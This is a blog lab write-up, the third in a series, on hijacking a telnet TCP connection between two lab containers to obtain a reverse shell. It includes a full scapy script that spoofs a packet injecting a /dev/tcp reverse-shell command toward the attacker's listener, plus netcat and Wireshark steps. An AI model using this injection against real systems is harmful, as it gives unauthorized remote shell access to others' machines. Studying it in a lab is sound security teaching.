+++
title = "TCP Attack Lab 3 - Obtaining a reverse shell"
date = "2023-05-01"
description = "Exploiting a TCP connection to obtain a reverse shell."

tags = ["security","writeup",]
+++


We hijack a TCP connection to give us a reverse shell.

In the second part of this series, we conducted a TCP hijack attack on a `telnet` connection between two users on the same LAN as a malicious actor.

In the third and final installment, we will go a step further to execute not an arbitrary command, but a reverse shell, a powerful technique that is commonly used in system exploits.


# Setup

The set up can be found in the [overview post](/blog/posts/tcp-attack-lab/0-overview).

 
# Hijacking a `telnet` Connection to Obtain a Reverse Shell

Following these steps will hijack a TCP connection between User 1 as the client and User 2 as the server. We will have the server give us a shell in a technique known as a reverse shell exploit.

First, I open Wireshark and monitor the LAN interface. I select the bridge interface starting with "br-". The characters following may change if you stop and start the containers in a separate occurrence.

Then, I use `telnet` to connect from User 1 to User 2.

!["wireshark initial"](/blog/images/tcp-reverse/wireshark-init.png)

Select the bridge interface.

---

Logging in to the `telnet` server (Remember: User 2) from the client generates network traffic that we will use to construct the hijack packet. 

!["telnet"](/blog/images/tcp-reverse/telnet.png)

The telnet connection between User 1 and User 2.

---

The last TCP packet sent from User 1 to User 2 will inform the source port, sequence, and acknowledgement numbers used in the hijack packet we will spoof from the attacker to the server.

!["wireshark data"](/blog/images/tcp-reverse/wireshark-data.png)

Using Wireshark to construct our packet.

---

# Using `netcat` to establish a TCP server

In order to see the output of the command, we will set up a TCP server using `netcat`. 

!["netcat initial"](/blog/images/tcp-reverse/netcat-init.png)

Using netcat to establish a TCP server to display exploit output.

---


# Running the exploit

The following code will send our reverse shell hijack packet:

```python
import argparse
from scapy.all import *

def spoof_hijack_packet(src_port, seq_num, ack_num):
	user1_ip = "10.9.0.6"
	user2_ip = "10.9.0.7"

	user1_port = src_port
	user2_port = 23

	ip = IP(src=user1_ip, dst=user2_ip)
	tcp = TCP(sport=user1_port, dport=user2_port, flags="A", seq=seq_num, ack=ack_num)
	data = "\r /bin/bash -i > /dev/tcp/10.9.0.1/9090 2>&1 0<&1 \r"

	pkt = ip/tcp/data

	print("SENDING REVERSE SHELL PACKET........")
	send(pkt)

if __name__ == "__main__":
	parser = argparse.ArgumentParser()
	parser.add_argument("-p", "--src_port", type=int, help="source port", required=True)
	parser.add_argument("-s", "--seq", type=int, help="last sequence number", required=True)
	parser.add_argument("-a", "--ack", type=int, help="last acknowledgement number", required=True)

	args = parser.parse_args()

	spoof_hijack_packet(args.src_port, args.seq, args.ack)
```

For convenience, I designed the program to take the source port number, sequence number, and acknowledgement numbers as arguments. I invoke it as follows with the data gathered from Wireshark.

!["attack"](/blog/images/tcp-reverse/python-attack.png)

Using netcat to establish a TCP server to display exploit output.

---

The `netcat` TCP server we established on port 9090 has given us a shell into User 2's machine. 

!["netcat after"](/blog/images/tcp-reverse/netcat-after.png)

A reverse shell has been granted.

---

Using this shell, I created a file called foo.txt in /home/seed. We can verify that the file was created. 

!["server"](/blog/images/tcp-reverse/server.png)

Files on the telnet server, User 2.

---

If you were to go back to the `telnet` connection, we see that the connection no longer takes input. This is because the machines have detected the funny business from our spoofed packet.


# That's it!

In this series we explored TCP RST and hijacking attacks and extended the hijacking attack to obtain a reverse shell.


### _Updated: May 1, 2023_
